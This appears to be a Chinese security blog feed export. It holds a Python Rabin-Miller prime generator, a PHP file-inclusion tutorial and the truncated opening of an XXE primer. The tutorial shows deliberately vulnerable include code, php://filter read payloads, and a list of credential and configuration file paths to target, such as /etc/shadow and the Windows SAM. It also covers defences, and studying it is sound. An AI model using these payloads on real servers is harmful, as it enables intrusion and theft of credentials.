<span class="token keyword">def</span> <span class="token function">rabinMiller</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" RabinMiller算法具体实现 """</span>
    t <span class="token operator">=</span> num <span class="token operator">-</span> <span class="token number">1</span>
    s <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token comment"># 计算 n - 1 = 2 ^ s * t</span>
    <span class="token keyword">while</span> t <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        t <span class="token operator">=</span> t <span class="token operator">//</span> <span class="token number">2</span>
        s <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">for</span> trials <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># 随机整数b，2 &lt;= b &lt;= n-2</span>
        b <span class="token operator">=</span> random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> num <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token comment"># r0 = b ^ t(mod n)</span>
        r <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> t<span class="token punctuation">,</span> num<span class="token punctuation">)</span>
        <span class="token keyword">if</span> r <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
            i <span class="token operator">=</span> <span class="token number">0</span>
            <span class="token keyword">while</span> r <span class="token operator">!=</span> <span class="token punctuation">(</span>num <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> i <span class="token operator">==</span> s <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>
                    <span class="token keyword">return</span> <span class="token boolean">False</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
                    r <span class="token operator">=</span> <span class="token punctuation">(</span>r <span class="token operator">**</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">%</span> num
        <span class="token keyword">return</span> <span class="token boolean">True</span>

<span class="token keyword">def</span> <span class="token function">isPrime</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 验证素数 """</span>
    <span class="token keyword">if</span> num <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    lowPrimes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span>
                 <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">139</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span>
                 <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">167</span><span class="token punctuation">,</span> <span class="token number">173</span><span class="token punctuation">,</span> <span class="token number">179</span><span class="token punctuation">,</span> <span class="token number">181</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">197</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">211</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">241</span><span class="token punctuation">,</span>
                 <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">257</span><span class="token punctuation">,</span> <span class="token number">263</span><span class="token punctuation">,</span> <span class="token number">269</span><span class="token punctuation">,</span> <span class="token number">271</span><span class="token punctuation">,</span> <span class="token number">277</span><span class="token punctuation">,</span> <span class="token number">281</span><span class="token punctuation">,</span> <span class="token number">283</span><span class="token punctuation">,</span> <span class="token number">293</span><span class="token punctuation">,</span> <span class="token number">307</span><span class="token punctuation">,</span> <span class="token number">311</span><span class="token punctuation">,</span> <span class="token number">313</span><span class="token punctuation">,</span> <span class="token number">317</span><span class="token punctuation">,</span> <span class="token number">331</span><span class="token punctuation">,</span> <span class="token number">337</span><span class="token punctuation">,</span> <span class="token number">347</span><span class="token punctuation">,</span> <span class="token number">349</span><span class="token punctuation">,</span>
                 <span class="token number">353</span><span class="token punctuation">,</span> <span class="token number">359</span><span class="token punctuation">,</span> <span class="token number">367</span><span class="token punctuation">,</span> <span class="token number">373</span><span class="token punctuation">,</span> <span class="token number">379</span><span class="token punctuation">,</span> <span class="token number">383</span><span class="token punctuation">,</span> <span class="token number">389</span><span class="token punctuation">,</span> <span class="token number">397</span><span class="token punctuation">,</span> <span class="token number">401</span><span class="token punctuation">,</span> <span class="token number">409</span><span class="token punctuation">,</span> <span class="token number">419</span><span class="token punctuation">,</span> <span class="token number">421</span><span class="token punctuation">,</span> <span class="token number">431</span><span class="token punctuation">,</span> <span class="token number">433</span><span class="token punctuation">,</span> <span class="token number">439</span><span class="token punctuation">,</span> <span class="token number">443</span><span class="token punctuation">,</span> <span class="token number">449</span><span class="token punctuation">,</span>
                 <span class="token number">457</span><span class="token punctuation">,</span> <span class="token number">461</span><span class="token punctuation">,</span> <span class="token number">463</span><span class="token punctuation">,</span> <span class="token number">467</span><span class="token punctuation">,</span> <span class="token number">479</span><span class="token punctuation">,</span> <span class="token number">487</span><span class="token punctuation">,</span> <span class="token number">491</span><span class="token punctuation">,</span> <span class="token number">499</span><span class="token punctuation">,</span> <span class="token number">503</span><span class="token punctuation">,</span> <span class="token number">509</span><span class="token punctuation">,</span> <span class="token number">521</span><span class="token punctuation">,</span> <span class="token number">523</span><span class="token punctuation">,</span> <span class="token number">541</span><span class="token punctuation">,</span> <span class="token number">547</span><span class="token punctuation">,</span> <span class="token number">557</span><span class="token punctuation">,</span> <span class="token number">563</span><span class="token punctuation">,</span> <span class="token number">569</span><span class="token punctuation">,</span>
                 <span class="token number">571</span><span class="token punctuation">,</span> <span class="token number">577</span><span class="token punctuation">,</span> <span class="token number">587</span><span class="token punctuation">,</span> <span class="token number">593</span><span class="token punctuation">,</span> <span class="token number">599</span><span class="token punctuation">,</span> <span class="token number">601</span><span class="token punctuation">,</span> <span class="token number">607</span><span class="token punctuation">,</span> <span class="token number">613</span><span class="token punctuation">,</span> <span class="token number">617</span><span class="token punctuation">,</span> <span class="token number">619</span><span class="token punctuation">,</span> <span class="token number">631</span><span class="token punctuation">,</span> <span class="token number">641</span><span class="token punctuation">,</span> <span class="token number">643</span><span class="token punctuation">,</span> <span class="token number">647</span><span class="token punctuation">,</span> <span class="token number">653</span><span class="token punctuation">,</span> <span class="token number">659</span><span class="token punctuation">,</span> <span class="token number">661</span><span class="token punctuation">,</span>
                 <span class="token number">673</span><span class="token punctuation">,</span> <span class="token number">677</span><span class="token punctuation">,</span> <span class="token number">683</span><span class="token punctuation">,</span> <span class="token number">691</span><span class="token punctuation">,</span> <span class="token number">701</span><span class="token punctuation">,</span> <span class="token number">709</span><span class="token punctuation">,</span> <span class="token number">719</span><span class="token punctuation">,</span> <span class="token number">727</span><span class="token punctuation">,</span> <span class="token number">733</span><span class="token punctuation">,</span> <span class="token number">739</span><span class="token punctuation">,</span> <span class="token number">743</span><span class="token punctuation">,</span> <span class="token number">751</span><span class="token punctuation">,</span> <span class="token number">757</span><span class="token punctuation">,</span> <span class="token number">761</span><span class="token punctuation">,</span> <span class="token number">769</span><span class="token punctuation">,</span> <span class="token number">773</span><span class="token punctuation">,</span> <span class="token number">787</span><span class="token punctuation">,</span>
                 <span class="token number">797</span><span class="token punctuation">,</span> <span class="token number">809</span><span class="token punctuation">,</span> <span class="token number">811</span><span class="token punctuation">,</span> <span class="token number">821</span><span class="token punctuation">,</span> <span class="token number">823</span><span class="token punctuation">,</span> <span class="token number">827</span><span class="token punctuation">,</span> <span class="token number">829</span><span class="token punctuation">,</span> <span class="token number">839</span><span class="token punctuation">,</span> <span class="token number">853</span><span class="token punctuation">,</span> <span class="token number">857</span><span class="token punctuation">,</span> <span class="token number">859</span><span class="token punctuation">,</span> <span class="token number">863</span><span class="token punctuation">,</span> <span class="token number">877</span><span class="token punctuation">,</span> <span class="token number">881</span><span class="token punctuation">,</span> <span class="token number">883</span><span class="token punctuation">,</span> <span class="token number">887</span><span class="token punctuation">,</span> <span class="token number">907</span><span class="token punctuation">,</span>
                 <span class="token number">911</span><span class="token punctuation">,</span> <span class="token number">919</span><span class="token punctuation">,</span> <span class="token number">929</span><span class="token punctuation">,</span> <span class="token number">937</span><span class="token punctuation">,</span> <span class="token number">941</span><span class="token punctuation">,</span> <span class="token number">947</span><span class="token punctuation">,</span> <span class="token number">953</span><span class="token punctuation">,</span> <span class="token number">967</span><span class="token punctuation">,</span> <span class="token number">971</span><span class="token punctuation">,</span> <span class="token number">977</span><span class="token punctuation">,</span> <span class="token number">983</span><span class="token punctuation">,</span> <span class="token number">991</span><span class="token punctuation">,</span> <span class="token number">997</span><span class="token punctuation">]</span>

    <span class="token keyword">if</span> num <span class="token keyword">in</span> lowPrimes<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">for</span> prime <span class="token keyword">in</span> lowPrimes<span class="token punctuation">:</span>
        <span class="token keyword">if</span> num <span class="token operator">%</span> prime <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> rabinMiller<span class="token punctuation">(</span>num<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">generateLargePrime</span><span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 生成大素数 """</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        num <span class="token operator">=</span> random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token punctuation">(</span>size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">**</span> size<span class="token punctuation">)</span>
        <span class="token keyword">if</span> isPrime<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> num

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">import</span> time
    start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>generateLargePrime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>NEU</category>
      </categories>
      <tags>
        <tag>CRYPTO</tag>
        <tag>NEU</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞笔记</title>
    <url>/2021/07/05/wen-jian-bao-han-lou-dong-bi-ji/</url>
    <content><![CDATA[<blockquote>
<p>参考：<a href="https://www.freebuf.com/articles/web/182280.html">Web安全实战系列：文件包含漏洞</a></p>
</blockquote>
<span id="more"></span>
<h1 id="文件包含简介"><a href="#文件包含简介" class="headerlink" title="文件包含简介"></a>文件包含简介</h1><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p>
<h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><p>PHP中文件包含函数有以下四种：</p>
<pre class="line-numbers language-none"><code class="language-none">require()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行
nclude()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本
require_once(), include_once()：若文件中代码已被包含则不会再次包含<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h2><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
<p>示例代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>例如：</p>
<p><code>$_GET[&#39;filename&#39;]</code>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[&#39;filename&#39;]</code>的值，执行非预期的操作。</p>
<h1 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h1><h2 id="本地文件包含（LFI）"><a href="#本地文件包含（LFI）" class="headerlink" title="本地文件包含（LFI）"></a>本地文件包含（LFI）</h2><p>包含服务器上的资源</p>
<h2 id="远程文件包含（RFI）"><a href="#远程文件包含（RFI）" class="headerlink" title="远程文件包含（RFI）"></a>远程文件包含（RFI）</h2><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>
<pre class="line-numbers language-none"><code class="language-none">allow_url_fopen &#x3D; On（是否允许打开远程文件）
allow_url_include &#x3D; On（是否允许include&#x2F;require远程文件）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h2><p>测试代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/2021/07/05/wen-jian-bao-han-lou-dong-bi-ji/161957.png" class>
<p>网页测试：</p>
<img src="/2021/07/05/wen-jian-bao-han-lou-dong-bi-ji/162145.png" class>
<p>其它文件：</p>
<img src="/2021/07/05/wen-jian-bao-han-lou-dong-bi-ji/162543.png" class>
<p><strong>常见的敏感信息路径：</strong></p>
<p>Windows系统</p>
<blockquote>
<p>c:\boot.ini // 查看系统版本</p>
<p>c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</p>
<p>c:\windows\repair\sam // 存储Windows系统初次安装的密码</p>
<p>c:\ProgramFiles\mysql\my.ini // MySQL配置</p>
<p>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</p>
<p>c:\windows\php.ini // php 配置信息</p>
</blockquote>
<p>Linux/Unix系统</p>
<blockquote>
<p>/etc/passwd // 账户信息</p>
<p>/etc/shadow // 账户密码文件</p>
<p>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</p>
<p>/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</p>
<p>/usr/local/app/php5/lib/php.ini // PHP相关配置</p>
<p>/etc/httpd/conf/httpd.conf // Apache配置文件</p>
<p>/etc/my.conf // mysql 配置文件</p>
</blockquote>
<p>文件包含可以结合文件上传漏洞，上传一句话木马图片，然后利用文件包含漏洞来包含这个文件</p>
<p><strong>session文件包含漏洞</strong></p>
<p><strong>利用条件：</strong> session的存储位置可以获取</p>
<p><a href="https://www.cnblogs.com/xiaoxiaosen/p/13066501.html">session文件包含漏洞复现</a></p>
<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p><strong>php://filter（本地磁盘文件进行读取）</strong></p>
<p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。</p>
<p>用法：</p>
<pre class="line-numbers language-none"><code class="language-none">?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;xxx.php 
?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>php://input （读取POST数据）</strong></p>
<img src="/2021/07/05/wen-jian-bao-han-lou-dong-bi-ji/211457.png" class>
<p>碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
<img src="/2021/07/05/wen-jian-bao-han-lou-dong-bi-ji/212217.png" class>
<p><strong>data://伪协议</strong></p>
<p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的；</p>
<img src="/2021/07/05/wen-jian-bao-han-lou-dong-bi-ji/212440.png" class>
<p>其它参考：<a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结</a></p>
<h1 id="漏洞绕过"><a href="#漏洞绕过" class="headerlink" title="漏洞绕过"></a>漏洞绕过</h1><p>测试代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>利用条件</strong>：</p>
<p>magic_quotes_gpc = Off &amp;&amp; php版本&lt;5.3.4</p>
<p>网页测试：</p>
<img src="/2021/07/05/wen-jian-bao-han-lou-dong-bi-ji/204921.png" class>
<p>参考：<a href="https://cloud.tencent.com/developer/article/1690034">任意文件包含漏洞的绕过方式</a></p>
<h1 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h1><ul>
<li>设置白名单<br>代码在进行文件包含时，如果文件名可以确定，可以设置白名单对传入的参数进行比较。</li>
<li>过滤危险字符<br>由于Include/Require可以对PHP Wrapper形式的地址进行包含执行（需要配置php.ini），在Linux环境中可以通过”../../”的形式进行目录绕过，所以需要判断文件名称是否为合法的PHP文件。</li>
<li>设置文件目录<br>PHP配置文件中有open_basedir选项可以设置用户需要执行的文件目录，如果设置目录的话，PHP仅仅在该目录内搜索文件。</li>
<li>关闭危险配置<br>PHP配置中的allow_url_include选项如果打开，PHP会通过Include/Require进行远程文件包含，由于远程文件的不可信任性及不确定性，在开发中禁止打开此选项，PHP默认是关闭的。</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>security</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈XXE攻击</title>
    <url>/2021/07/06/qian-tan-xxe-gong-ji/</url>
    <content><![CDATA[<blockquote>
<p><strong>XML 被设计用来传输和存储数据。</strong></p>
<p><strong>HTML 被设计用来显示数据。</strong></p>
</blockquote>
<span id="more"></span>
<h1 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h1><p>参考自：<a href="https://www.w3school.com.cn/xml/xml_intro.asp">XML 简介</a></p>
<p><strong>什么是XML</strong></p>
<ul>
<li>XML 指可扩展标记语言（EXtensible Markup Language）</li>
<li>XML 是一种标记语言，很类似 HTML</li>
<li>XML 的设计宗旨是传输数据，而非显示数据</li>
<li>XML 标签没有被预定义。您需要自行定义标签。</li>
<li>XML 被设计为具有自我描述性。</li>
</ul>
<h2 id="XML文档结构"><a href="#XML文档结构" class="headerlink" title="XML文档结构"></a>XML文档结构</h2><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!-- XML 声明 --&gt;
&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;

&lt;!-- DTD --&gt;
&lt;!DOCTYPE note [
  &lt;!ELEMENT note (to,from,heading,body)&gt;
  &lt;!ELEMENT to      (#PCDATA)&gt;
  &lt;!ELEMENT from    (#PCDATA)&gt;
  &lt;!ELEMENT heading (#PCDATA)&gt;
  &lt;!ELEMENT body    (#PCDATA)&gt;
]&gt;

&lt;!-- 文档元素 --&gt;
&lt;note&gt;
  &lt;to&gt;George&lt;&#x2F;to&gt;
  &lt;from&gt;John&lt;&#x2F;from&gt;
  &lt;heading&gt;Reminder&lt;&#x2F;heading&gt;
  &lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;
&lt;&#x2F;note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>以上 DTD 解释如下：</strong></p>
<ul>
<li><p><em>!DOCTYPE note</em>  定义此文档是 note 类型的文档。</p>
</li>
<li><p><em>!ELEMENT note</em>  定义 note 元素有四个元素：”to、from、heading,、body”</p>
</li>
<li><p><em>!ELEMENT to</em>  定义 to 元素为 “<em>#PCDATA</em>“ 类型</p>
</li>
<li><p><em>!ELEMENT from</em>  定义 from 元素为 “<em>#PCDATA</em>“ 类型</p>
</li>
<li><p><em>!ELEMENT heading</em>  定义 heading 元素为 “<em>#PCDATA</em>“ 类型</p>
</li>
<li><p><em>!ELEMENT body</em>  定义 body 元素为 “<em>#PCDATA</em>“ 类型</p>
</li>
</ul>
<h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>文档类型定义（DTD, Document Type Definition）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p>
<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
<p><strong>内部声明DTD</strong></p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE 根元素 [元素声明]&gt;

&lt;!DOCTYPE note [......]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><strong>外部声明DTD</strong></p>
 <pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token name">SYSTEM</span> <span class="token string">"note.dtd"</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>note.dtd</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ELEMENT note (to,from,heading,body)&gt;
&lt;!ELEMENT to (#PCDATA)&gt;
&lt;!ELEMENT from (#PCDATA)&gt;
&lt;!ELEMENT heading (#PCDATA)&gt;
&lt;!ELEMENT body (#PCDATA)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>
<p>实体引用是对实体的引用。</p>
<p>实体可在内部或外部进行声明。</p>
<h3 id="一个内部实体声明"><a href="#一个内部实体声明" class="headerlink" title="一个内部实体声明"></a>一个内部实体声明</h3><p><strong>语法</strong>：</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>例子</strong>：</p>
<p>DTD 例子:</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;
&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>XML 例子:</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&writer;">&amp;writer;</span>&amp;copyright;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>注释:</strong> 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>
<h3 id="一个外部实体声明"><a href="#一个外部实体声明" class="headerlink" title="一个外部实体声明"></a>一个外部实体声明</h3><p>语法：</p>
